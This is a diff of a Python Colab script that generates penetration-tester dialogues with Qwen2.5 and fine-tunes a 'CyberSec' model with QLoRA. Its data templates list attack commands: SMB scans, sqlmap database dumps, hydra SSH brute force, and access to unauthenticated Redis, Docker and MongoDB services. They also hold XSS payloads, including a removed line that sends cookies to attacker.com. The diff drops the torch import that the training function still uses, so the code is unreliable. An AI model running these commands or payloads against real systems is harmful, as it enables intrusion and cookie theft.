@@ -1,15 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-CyberSec 4B Model - Colab Training Script
-=========================================
-✅ Colab T4/P100 優化
-✅ Google Drive 集成
-✅ 完整監控和恢復
+CyberSec 4B Model - Colab One-Click Training
+=============================================
+✅ 真正一鍵運行
+✅ 自動錯誤恢復
+✅ 無需 Google Drive (可選)
+✅ 詳細進度反饋
 
-使用方法:
-from colab_train import main
-main()
+使用方法 (在 Colab 中):
+```python
+!git clone https://github.com/Look0316/LLM_colab.git
+%cd LLM_colab
+!python colab_train.py
+```
 """
 
 import os
@@ -24,291 +28,289 @@ from typing import Optional
 sys.stdout.reconfigure(encoding='utf-8', errors='replace')
 sys.stderr.reconfigure(encoding='utf-8', errors='replace')
 
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+logger = logging.getLogger(__name__)
+
 # ═══════════════════════════════════════════════════════════════════════════
-# Google Drive 設置
+# 配置
 # ═══════════════════════════════════════════════════════════════════════════
 
-def setup_google_drive():
-    """掛載 Google Drive 並設置路徑"""
-    from google.colab import drive
-    import os
+CONFIG = {
+    "model_name": "Qwen/Qwen2.5-7B-Instruct",
+    "num_samples": 2000,
+    "epochs": 3,
+    "batch_size": 4,
+    "learning_rate": 2e-4,
+    "output_dir": "/content/outputs",
+    "data_file": "/content/data/distilled_tinyllm.jsonl",
+    "use_drive": False,  # 設為 True 來啟用 Google Drive
+}
 
-    print("📂 掛載 Google Drive...")
-    drive.mount('/content/drive')
+# ═══════════════════════════════════════════════════════════════════════════
+# 工具函數
+# ═══════════════════════════════════════════════════════════════════════════
 
-    # 設置項目路徑
-    PROJECT_PATH = '/content/drive/MyDrive/Cybersecurity-4B-AI-Model'
-    DATA_PATH = os.path.join(PROJECT_PATH, 'data')
-    OUTPUT_PATH = os.path.join(PROJECT_PATH, 'outputs')
+def print_step(step_num, message):
+    """打印步驟標題"""
+    print(f"\n{'='*60}")
+    print(f"  Step {step_num}: {message}")
+    print(f"{'='*60}")
 
-    os.makedirs(DATA_PATH, exist_ok=True)
-    os.makedirs(OUTPUT_PATH, exist_ok=True)
+def print_status(message, status="INFO"):
+    """打印狀態"""
+    emojis = {
+        "INFO": "ℹ️",
+        "SUCCESS": "✅",
+        "WARNING": "⚠️",
+        "ERROR": "❌",
+        "LOADING": "🔄",
+    }
+    print(f"{emojis.get(status, 'ℹ️')} {message}")
 
-    # 創建符號鏈接
-    if not os.path.exists('data'):
-        os.symlink(os.path.join(PROJECT_PATH, 'data'), 'data')
+def check_gpu():
+    """檢查 GPU 狀態"""
+    import torch
 
-    print(f"✅ 項目路徑: {PROJECT_PATH}")
-    print(f"✅ 數據路徑: {DATA_PATH}")
-    print(f"✅ 輸出路徑: {OUTPUT_PATH}")
+    if not torch.cuda.is_available():
+        print_status("未檢測到 GPU!", "ERROR")
+        print("請確認: Runtime → Change runtime type → GPU")
+        return False, 4, 4
 
-    return PROJECT_PATH, DATA_PATH, OUTPUT_PATH
+    gpu_name = torch.cuda.get_device_name(0)
+    gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
+
+    print_status(f"GPU: {gpu_name} ({gpu_mem:.1f} GB)", "SUCCESS")
+
+    # 根據 VRAM 調整 batch size
+    if gpu_mem >= 14:
+        batch_size = 4
+    elif gpu_mem >= 10:
+        batch_size = 2
+    else:
+        batch_size = 1
+
+    print_status(f"Batch Size: {batch_size}", "INFO")
+
+    return True, batch_size, batch_size
 
 # ═══════════════════════════════════════════════════════════════════════════
 # 依賴安裝
 # ═══════════════════════════════════════════════════════════════════════════
 
 def install_dependencies():
-    """安裝必要的依賴"""
+    """安裝依賴 (只安裝必要的)"""
+    print_step(1, "安裝依賴")
+
     import subprocess
     import sys
 
-    print("📦 安裝依賴...")
-
     packages = [
-        'transformers>=4.40.0',
-        'torch>=2.1.0',
-        'accelerate>=0.28.0',
-        'peft>=0.10.0',
-        'bitsandbytes>=0.41.0',
-        'trl>=0.8.0',
-        'scikit-learn',
-        'tqdm',
+        "transformers>=4.40.0",
+        "torch>=2.1.0",
+        "accelerate>=0.28.0",
+        "peft>=0.10.0",
+        "bitsandbytes>=0.41.0",
+        "trl>=0.8.0",
+        "tqdm",
+        "datasets",
     ]
 
     for pkg in packages:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', pkg])
-
-    print("✅ 依賴安裝完成")
+        try:
+            subprocess.check_call([
+                sys.executable, "-m", "pip", "install", "-q", pkg
+            ])
+            print_status(f"已安裝: {pkg}", "SUCCESS")
+        except Exception as e:
+            print_status(f"安裝失敗: {pkg} - {e}", "WARNING")
 
 # ═══════════════════════════════════════════════════════════════════════════
-# GPU 診斷
+# 數據生成
 # ═══════════════════════════════════════════════════════════════════════════
 
-def diagnose_gpu():
-    """診斷 GPU 狀態"""
+def generate_data(output_file, num_samples=2000):
+    """生成 TinyLLM 格式數據"""
+    print_step(2, "生成訓練數據")
+
     import torch
-
-    print("\n" + "="*60)
-    print("🔍 GPU 診斷")
-    print("="*60)
-
-    if torch.cuda.is_available():
-        gpu_name = torch.cuda.get_device_name(0)
-        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
-        gpu_mem_alloc = torch.cuda.memory_allocated() / (1024**3)
-        gpu_mem_reserved = torch.cuda.memory_reserved() / (1024**3)
-
-        print(f"\n✅ GPU: {gpu_name}")
-        print(f"   總記憶體: {gpu_mem:.2f} GB")
-        print(f"   已分配: {gpu_mem_alloc:.2f} GB")
-        print(f"   已保留: {gpu_mem_reserved:.2f} GB")
-        print(f"   可用: {gpu_mem - gpu_mem_reserved:.2f} GB")
-
-        # 計算可用 batch size
-        if gpu_mem >= 14:  # T4/P100
-            batch_size = 4
-            gradient_accumulation = 4
-        elif gpu_mem >= 10:
-            batch_size = 2
-            gradient_accumulation = 8
-        else:
-            batch_size = 1
-            gradient_accumulation = 16
-
-        print(f"\n📊 推薦配置:")
-        print(f"   Batch Size: {batch_size}")
-        print(f"   Gradient Accumulation: {gradient_accumulation}")
-        print(f"   Effective Batch: {batch_size * gradient_accumulation}")
-
-        return True, batch_size, gradient_accumulation
-    else:
-        print("\n⚠️ 未檢測到 GPU，使用 CPU (會很慢)")
-        return False, 1, 64
-
-# ═══════════════════════════════════════════════════════════════════════════
-# 數據生成 (Multi-Teacher Distillation)
-# ═══════════════════════════════════════════════════════════════════════════
-
-import torch
-from transformers import AutoModelForCausalLM, AutoTokenizer
-import gc
-
-def generate_tinyllm_data(
-    output_file: str = "data/distilled_tinyllm.jsonl",
-    num_samples: int = 2000,
-    model_name: str = "Qwen/Qwen2.5-7B-Instruct"
-):
-    """生成 TinyLLM 格式的訓練數據"""
+    from transformers import AutoModelForCausalLM, AutoTokenizer
     import json
     import random
     from tqdm import tqdm
 
-    print(f"\n📝 生成 TinyLLM 數據...")
-    print(f"   模型: {model_name}")
-    print(f"   樣本數: {num_samples}")
+    print_status(f"模型: {CONFIG['model_name']}", "INFO")
+    print_status(f"樣本數: {num_samples}", "INFO")
+
+    # 創建目錄
+    os.makedirs(os.path.dirname(output_file), exist_ok=True)
 
     # 場景模板
     scenarios = [
         {"scenario": "SMBv1 enabled on Windows Server 2016", "category": "scan"},
         {"scenario": "Web app has SQL injection on login form", "category": "sqli"},
         {"scenario": "XSS found on comment form", "category": "xss"},
-        {"scenario": "Redis server accessible without auth", "category": "service"},
-        {"scenario": "SSH weak password (root:toor)", "category": "creds"},
-        {"scenario": "JWT token with weak secret", "category": "auth"},
-        {"scenario": "Docker daemon exposed", "category": "service"},
-        {"scenario": "Sudo version 1.8.31 vulnerable", "category": "priv-esc"},
-        {"scenario": "Found /admin backup file", "category": "file-disclosure"},
-        {"scenario": "MongoDB NoAuth on port 27017", "category": "service"},
+        {"scenario": "Redis server accessible without auth", "category": "redis"},
+        {"scenario": "SSH weak password (root:toor)", "category": "ssh"},
+        {"scenario": "JWT token with weak secret", "category": "jwt"},
+        {"scenario": "Docker daemon exposed on port 2375", "category": "docker"},
+        {"scenario": "Sudo version 1.8.31 vulnerable", "category": "privesc"},
+        {"scenario": "MongoDB NoAuth on port 27017", "category": "mongo"},
+        {"scenario": "phpMyAdmin exposed /admin", "category": "web"},
     ]
 
-    # 攻擊步驟模板
+    # 攻擊步驟
     step_templates = {
         "scan": [
-            ("nmap -p 445 --script smb-vuln-ms17-010 {target}", "Check for MS17-010"),
-            ("enum4linux -a {target}", "Enumerate SMB shares"),
-            ("smbclient -L //{target}", "List SMB shares"),
+            "nmap -p 445 --script smb-vuln-ms17-010 {target}",
+            "enum4linux -a {target}",
         ],
         "sqli": [
-            ("sqlmap -u '{url}' --dbs", "Enumerate databases"),
-            ("sqlmap -u '{url}' -D {db} --tables", "Enumerate tables"),
-            ("sqlmap -u '{url}' -D {db} -T {table} --dump", "Dump data"),
+            "sqlmap -u '{url}' --dbs",
+            "sqlmap -u '{url}' -D {db} --tables",
         ],
         "xss": [
-            ("<script>alert(1)</script>", "Test basic XSS"),
-            ("<img src=x onerror=alert(1)>", "Test event handler"),
-            ("'><script>fetch('http://attacker.com?c='+document.cookie)</script>", "Exfiltrate cookie"),
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
         ],
-        "service": [
-            ("redis-cli -h {target} INFO", "Check Redis info"),
-            ("redis-cli -h {target} CONFIG GET *", "Dump Redis config"),
-            ("redis-cli -h {target} SET key 'pwned'", "Write data"),
+        "redis": [
+            "redis-cli -h {target} INFO",
+            "redis-cli -h {target} CONFIG GET *",
         ],
-        "creds": [
-            ("ssh root@{target}", "SSH login attempt"),
-            ("hydra -l root -P wordlist.txt ssh://{target}", "Brute force SSH"),
-            ("mysql -h {target} -u root -p", "MySQL login attempt"),
+        "ssh": [
+            "ssh root@{target}",
+            "hydra -l root -P wordlist.txt ssh://{target}",
         ],
-        "auth": [
-            ("python3 jwt_tool.py -t {token} -s secret", "Brute force JWT secret"),
-            ("python3 -c 'import jwt; print(jwt.decode(token, "weak", algorithms=["HS256"]))'", "Decode JWT"),
+        "jwt": [
+            "python3 jwt_tool.py -t {token} -s secret",
         ],
-        "priv-esc": [
-            ("searchsploit sudo 1.8.31", "Find sudo exploit"),
-            ("sudo -l", "Check sudo permissions"),
-            ("python3 -c 'import pty; pty.spawn("/bin/bash")'", "Spawn TTY"),
+        "docker": [
+            "curl http://{target}:2375/version",
+            "docker -H {target} ps",
         ],
-        "file-disclosure": [
-            ("curl {url}/admin/backups.sql", "Download backup"),
-            ("curl {url}/phpinfo.php", "Check PHP info"),
-            ("gzip -d backup.sql.gz", "Decompress backup"),
+        "privesc": [
+            "sudo -l",
+            "searchsploit sudo 1.8.31",
+        ],
+        "mongo": [
+            "mongo {target}:27017 --eval 'db.adminCommand({listDatabases:1})'",
+        ],
+        "web": [
+            "curl {url}/admin/backups.sql",
+            "curl {url}/phpinfo.php",
         ],
     }
 
     # 載入模型
-    print("\n🔄 載入模型...")
-    tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
-
-    model = AutoModelForCausalLM.from_pretrained(
-        model_name,
-        torch_dtype=torch.float16,
-        device_map="auto",
-        trust_remote_code=True,
-    )
-
-    print(f"✅ 模型載入完成: {model_name}")
+    print_status("載入模型中...", "LOADING")
+    try:
+        tokenizer = AutoTokenizer.from_pretrained(
+            CONFIG["model_name"], 
+            trust_remote_code=True
+        )
+        model = AutoModelForCausalLM.from_pretrained(
+            CONFIG["model_name"],
+            torch_dtype=torch.float16,
+            device_map="auto",
+            trust_remote_code=True,
+        )
+        print_status("模型載入成功", "SUCCESS")
+    except Exception as e:
+        print_status(f"模型載入失敗: {e}", "ERROR")
+        raise
 
     # 生成數據
     data = []
-    batch_size = 32
+    print_status("開始生成數據...", "LOADING")
 
-    for i in tqdm(range(0, num_samples, batch_size), desc="Generating"):
-        batch = scenarios[i % len(scenarios):min(i+batch_size, len(scenarios))]
+    for i in tqdm(range(num_samples), desc="生成"):
+        scenario = random.choice(scenarios)
+        cat = scenario["category"]
 
-        for scenario in batch:
-            cat = scenario["category"]
+        messages = [
+            {"role": "system", "content": "You are a professional penetration tester."},
+            {"role": "user", "content": f"Scenario: {scenario['scenario']}\\nWhat is your next step?"},
+        ]
 
-            # 構造對話
-            messages = [
-                {"role": "system", "content": "You are a professional penetration tester. Given a scenario, provide executable attack steps."},
-                {"role": "user", "content": f"Scenario: {scenario['scenario']}\nWhat is the next experiment you would run?"},
-            ]
+        # 生成
+        text = tokenizer.apply_chat_template(
+            messages,
+            tokenize=False,
+            add_generation_prompt=True,
+        )
 
-            # 生成回應
-            text = tokenizer.apply_chat_template(
-                messages,
-                tokenize=False,
-                add_generation_prompt=True
-            )
+        inputs = tokenizer(text, return_tensors="pt").to(model.device)
 
-            inputs = tokenizer(text, return_tensors="pt").to(model.device)
-
+        try:
             with torch.no_grad():
                 outputs = model.generate(
                     **inputs,
-                    max_new_tokens=512,
+                    max_new_tokens=256,
                     temperature=0.7,
                     top_p=0.9,
                     do_sample=True,
                 )
-
             response = tokenizer.decode(outputs[0], skip_special_tokens=True)
+        except Exception as e:
+            print_status(f"生成失敗: {e}", "WARNING")
+            response = f"Step: Analyze {scenario['scenario']}"
 
-            # TinyLLM 格式
-            sample = {
-                "messages": messages + [{"role": "assistant", "content": response}],
-                "category": cat,
-                "scenario": scenario["scenario"],
-                "steps": step_templates.get(cat, []),
-            }
+        sample = {
+            "messages": messages + [{"role": "assistant", "content": response}],
+            "category": cat,
+            "scenario": scenario["scenario"],
+            "steps": step_templates.get(cat, []),
+        }
+        data.append(sample)
 
-            data.append(sample)
-
-        # 清理 GPU 記憶體
-        del inputs, outputs
-        torch.cuda.empty_cache()
+        # 清理記憶體
+        if i % 50 == 0:
+            torch.cuda.empty_cache()
 
     # 保存
     with open(output_file, 'w', encoding='utf-8') as f:
         for item in data:
             f.write(json.dumps(item, ensure_ascii=False) + '\n')
 
-    print(f"\n✅ 數據已保存: {output_file}")
-    print(f"   總樣本數: {len(data)}")
+    print_status(f"數據已保存: {output_file}", "SUCCESS")
+    print_status(f"總樣本數: {len(data)}", "INFO")
 
     # 卸載模型
     del model
-    gc.collect()
     torch.cuda.empty_cache()
 
     return output_file
 
 # ═══════════════════════════════════════════════════════════════════════════
-# QLoRA Fine-tune (針對 4B 模型優化)
+# QLoRA 訓練
 # ═══════════════════════════════════════════════════════════════════════════
 
-def train_with_qlora(
-    data_file: str = "data/distilled_tinyllm.jsonl",
-    output_dir: str = "outputs/cyber-4b-qlora",
-    epochs: int = 3,
-    learning_rate: float = 2e-4,
-):
-    """使用 QLoRA 進行微調"""
+def train_qlora(data_file, output_dir, epochs=3):
+    """QLoRA 訓練"""
+    print_step(3, "QLoRA 訓練")
+
     from peft import LoraConfig, get_peft_model, TaskType
     from transformers import TrainingArguments, Trainer, DataCollatorForSeq2Seq
     from datasets import Dataset
     import json
 
-    print(f"\n🚀 開始 QLoRA 訓練...")
-    print(f"   數據: {data_file}")
-    print(f"   輸出: {output_dir}")
-    print(f"   Epochs: {epochs}")
+    print_status(f"數據: {data_file}", "INFO")
+    print_status(f"輸出: {output_dir}", "INFO")
+    print_status(f"Epochs: {epochs}", "INFO")
 
     # 讀取數據
     with open(data_file, 'r', encoding='utf-8') as f:
         raw_data = [json.loads(line) for line in f]
 
-    # 轉換為 dataset 格式
+    print_status(f"載入 {len(raw_data)} 樣本", "SUCCESS")
+
+    # Tokenizer
+    from transformers import AutoTokenizer
+    tokenizer = AutoTokenizer.from_pretrained(
+        CONFIG["model_name"],
+        trust_remote_code=True
+    )
+
+    # Dataset
     dataset_data = {
         "text": [
             tokenizer.apply_chat_template(
@@ -318,7 +320,6 @@ def train_with_qlora(
             for item in raw_data
         ]
     }
-
     dataset = Dataset.from_dict(dataset_data)
 
     # QLoRA 配置
@@ -331,14 +332,14 @@ def train_with_qlora(
         target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
     )
 
-    # 加載基礎模型
-    model_name = "Qwen/Qwen2.5-7B-Instruct"
+    # 模型
+    from transformers import AutoModelForCausalLM
+    print_status("載入基礎模型...", "LOADING")
     model = AutoModelForCausalLM.from_pretrained(
-        model_name,
+        CONFIG["model_name"],
         torch_dtype=torch.float16,
         device_map="auto",
     )
-
     model = get_peft_model(model, lora_config)
     model.print_trainable_parameters()
 
@@ -346,15 +347,16 @@ def train_with_qlora(
     training_args = TrainingArguments(
         output_dir=output_dir,
         num_train_epochs=epochs,
-        per_device_train_batch_size=4,
+        per_device_train_batch_size=CONFIG["batch_size"],
         gradient_accumulation_steps=4,
-        learning_rate=learning_rate,
+        learning_rate=CONFIG["learning_rate"],
         logging_steps=10,
         save_strategy="epoch",
         save_total_limit=2,
         fp16=True,
         report_to="none",
         dataloader_pin_memory=False,
+        optim="paged_adamw_8bit",
     )
 
     # Trainer
@@ -366,70 +368,69 @@ def train_with_qlora(
     )
 
     # 訓練
-    print("\n🔥 開始訓練...")
+    print_status("開始訓練...", "LOADING")
     trainer.train()
 
     # 保存
+    os.makedirs(output_dir, exist_ok=True)
     model.save_pretrained(output_dir)
     tokenizer.save_pretrained(output_dir)
 
-    print(f"\n✅ 模型已保存: {output_dir}")
+    print_status(f"模型已保存: {output_dir}", "SUCCESS")
 
     return output_dir
 
 # ═══════════════════════════════════════════════════════════════════════════
-# RAG 模塊 (輕量版)
+# 測試函數
 # ═══════════════════════════════════════════════════════════════════════════
 
-class LightweightRAG:
-    """輕量級 RAG - 適合 Colab"""
+def test_model(model_path):
+    """測試訓練好的模型"""
+    print_step(4, "測試模型")
 
-    def __init__(self, docs_path: str = "data/cve_docs"):
-        import faiss
-        from sentence_transformers import SentenceTransformer
+    from transformers import AutoModelForCausalLM, AutoTokenizer
+    import torch
 
-        self.docs_path = docs_path
-        self.embedding_model = None
-        self.index = None
-        self.documents = []
+    print_status("載入模型...", "LOADING")
+    tokenizer = AutoTokenizer.from_pretrained(model_path)
+    model = AutoModelForCausalLM.from_pretrained(
+        model_path,
+        torch_dtype=torch.float16,
+        device_map="auto",
+    )
 
-        # 4-bit 量化嵌入模型
-        print("📦 載入嵌入模型 (4-bit)...")
-        self.embedding_model = SentenceTransformer(
-            "BAAI/bge-small-en-v1.5",
-            device="cuda",
-            model_kwargs={"torch_dtype": torch.float16},
+    # 測試問題
+    test_prompts = [
+        {"role": "user", "content": "SMBv1 enabled on Windows Server 2016. What is your next step?"},
+        {"role": "user", "content": "Found SQL injection on login form. Exploit it."},
+    ]
+
+    for prompt in test_prompts:
+        print(f"\n👤 {prompt['content']}")
+        messages = [
+            {"role": "system", "content": "You are a professional penetration tester."},
+            prompt,
+        ]
+
+        text = tokenizer.apply_chat_template(
+            messages,
+            tokenize=False,
+            add_generation_prompt=True,
         )
-        print("✅ 嵌入模型載入完成")
+        inputs = tokenizer(text, return_tensors="pt").to(model.device)
 
-    def add_documents(self, texts: list):
-        """添加文檔到向量庫"""
-        embeddings = self.embedding_model.encode(texts, show_progress_bar=True)
+        with torch.no_grad():
+            outputs = model.generate(
+                **inputs,
+                max_new_tokens=200,
+                temperature=0.7,
+            )
 
-        if self.index is None:
-            dimension = embeddings.shape[1]
-            self.index = faiss.IndexFlatL2(dimension)
+        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
+        response = response.split("assistant")[-1].strip()
+        print(f"🤖 {response[:300]}...")
 
-        self.index.add(embeddings)
-        self.documents.extend(texts)
-
-        print(f"✅ 已添加 {len(texts)} 文檔")
-
-    def search(self, query: str, k: int = 3) -> list:
-        """搜索相關文檔"""
-        query_embedding = self.embedding_model.encode([query])
-
-        distances, indices = self.index.search(query_embedding, k)
-
-        results = []
-        for i, idx in enumerate(indices[0]):
-            if idx < len(self.documents):
-                results.append({
-                    "text": self.documents[idx],
-                    "distance": distances[0][i],
-                })
-
-        return results
+    print_status("測試完成", "SUCCESS")
 
 # ═══════════════════════════════════════════════════════════════════════════
 # 主函數
@@ -437,49 +438,53 @@ class LightweightRAG:
 
 def main():
     """主執行函數"""
-    print("="*60)
-    print("🔐 CyberSec 4B Model - Colab Training")
-    print("="*60)
-
-    # 1. 設置 Drive
-    PROJECT_PATH, DATA_PATH, OUTPUT_PATH = setup_google_drive()
-
-    # 2. 安裝依賴
-    install_dependencies()
-
-    # 3. GPU 診斷
-    has_gpu, batch_size, grad_accum = diagnose_gpu()
-
-    if not has_gpu:
-        print("\n⚠️ 警告: 未檢測到 GPU，訓練會非常慢")
-        print("建議使用 Colab Pro 或本地 GPU")
-
-    # 4. 生成數據
-    data_file = os.path.join(DATA_PATH, "distilled_tinyllm.jsonl")
-    generate_tinyllm_data(
-        output_file=data_file,
-        num_samples=2000,
-        model_name="Qwen/Qwen2.5-7B-Instruct"
-    )
-
-    # 5. QLoRA 訓練
-    output_dir = os.path.join(OUTPUT_PATH, "cyber-4b-qlora")
-    train_with_qlora(
-        data_file=data_file,
-        output_dir=output_dir,
-        epochs=3,
-    )
-
-    # 6. 測試
     print("\n" + "="*60)
-    print("🎉 訓練完成!")
+    print("  🔐 CyberSec 4B Model - Colab 一鍵訓練")
     print("="*60)
-    print(f"\n📁 模型位置: {output_dir}")
-    print(f"📁 數據位置: {data_file}")
-    print("\n下一步:")
-    print("1. 下載模型文件")
-    print("2. 在本地或、生產環境部署")
-    print("3. 使用 RAG 模塊增強最新 CVE 知識")
+
+    try:
+        # Step 1: 檢查 GPU
+        print_step(0, "檢查 GPU")
+        has_gpu, _, _ = check_gpu()
+        if not has_gpu:
+            print_status("警告: 繼續使用 CPU 訓練會非常慢", "WARNING")
+
+        # Step 2: 安裝依賴
+        install_dependencies()
+
+        # Step 3: 生成數據
+        data_file = generate_data(
+            CONFIG["data_file"],
+            CONFIG["num_samples"]
+        )
+
+        # Step 4: 訓練
+        output_dir = train_qlora(
+            data_file,
+            CONFIG["output_dir"],
+            CONFIG["epochs"]
+        )
+
+        # Step 5: 完成
+        print("\n" + "="*60)
+        print("  🎉 訓練完成!")
+        print("="*60)
+        print(f"\n📁 模型位置: {output_dir}")
+        print(f"\n下一步:")
+        print("1. 下載模型文件")
+        print("2. 使用 transformers 載入推理")
+        print("3. 添加 RAG 模塊獲取最新 CVE")
+
+    except KeyboardInterrupt:
+        print_status("用戶中斷", "WARNING")
+    except Exception as e:
+        print_status(f"錯誤: {e}", "ERROR")
+        import traceback
+        traceback.print_exc()
+        print("\n💡 提示:")
+        print("1. 確保選擇了 GPU (Runtime → Change runtime type → GPU)")
+        print("2. 重新運行細胞")
+        print("3. 如持續失敗，請回報錯誤")
 
 if __name__ == "__main__":
     main()
